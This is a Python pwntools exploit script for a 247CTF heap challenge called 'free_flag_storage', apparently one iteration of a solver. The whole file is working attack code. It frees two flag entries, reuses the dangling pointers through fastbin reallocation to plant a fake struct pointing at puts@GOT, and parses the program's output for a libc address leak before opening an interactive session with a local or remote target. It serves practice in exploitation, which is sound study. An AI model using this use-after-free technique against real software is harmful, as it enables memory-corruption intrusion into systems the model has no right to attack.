#!/usr/bin/env python3
"""
UAF Exploit v6 - Keep count high while creating overlap

Problem: delete decrements count, so after deleting both flags, count=0
         add brings it to 1, show only prints 1 flag

Solution: Keep one flag alive, delete others strategically
1. flag0(8b), flag1(8b), flag2(8b) - count=3
2. delete(0), delete(1) - count=1, flags[0] and flags[1] dangling
   fastbin-24: struct1 -> struct0
   fastbin-16: value1 -> value0
3. add flag3(16b) - count=2, placed at flags[count]=flags[1]
   struct3 = struct1, value3 = struct0!
   flags[0] (dangling) -> struct0 = value3 = our fake struct
4. With count=2, show prints flags[0] (our fake) and flags[1] (normal)
"""
from pwn import *

context.binary = elf = ELF('./free_flag_storage')
context.log_level = 'info'

puts_got = 0x804b028
atoi_got = 0x804b034

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    return process('./free_flag_storage')

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit(idx, value, length, cid=99, score=99):
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

p.recvuntil(b'Enter command:')

log.info("Step 1: Create 3 flags with 8-byte values")
add(8, b'AAAAAAAA', 1, 11)  # flag0: struct0(24b), value0(16b)
add(8, b'BBBBBBBB', 2, 22)  # flag1: struct1(24b), value1(16b)
add(8, b'CCCCCCCC', 3, 33)  # flag2: struct2(24b), value2(16b)
log.info("Initial state:")
log.info(show().decode())

log.info("Step 2: Delete flag0 then flag1 - keep flag2 alive")
delete(0)  # fastbin-24: struct0, count=2
delete(1)  # fastbin-24: struct1->struct0, count=1
# flags[0]->struct0 (dangling), flags[1]->struct1 (dangling), flags[2]->struct2 (valid)

log.info("Step 3: Add flag3 with 16-byte value = fake struct")
log.info("  malloc(struct3) = struct1")
log.info("  malloc(value3)  = struct0 <-- this is where flags[0] still points!")

# Fake struct: length=4, value_ptr=puts@GOT
fake_struct = p32(4) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
add(16, fake_struct, 4, 44)

# After add: count=2, flags[1]=struct3=struct1
# flags[0] (dangling) -> struct0 = value3 = our fake struct!

log.info("Step 4: Show output - flags[0] should read fake struct")
data = show()
log.info(f"Raw output: {data}")

# Parse for libc leak
for line in data.split(b'\n'):
    if b'247CTF{' in line:
        log.info(f"Line: {line}")
        start = line.find(b'{')
        end = line.find(b'}')
        if start != -1 and end != -1:
            content = line[start+1:end]
            if len(content) >= 4:
                try:
                    leaked = u32(content[:4])
                    log.success(f"Possible leak: {hex(leaked)}")
                    if leaked > 0xf7000000:  # Looks like libc
                        log.success(f"LIBC LEAK: puts = {hex(leaked)}")
                except:
                    pass

p.interactive()
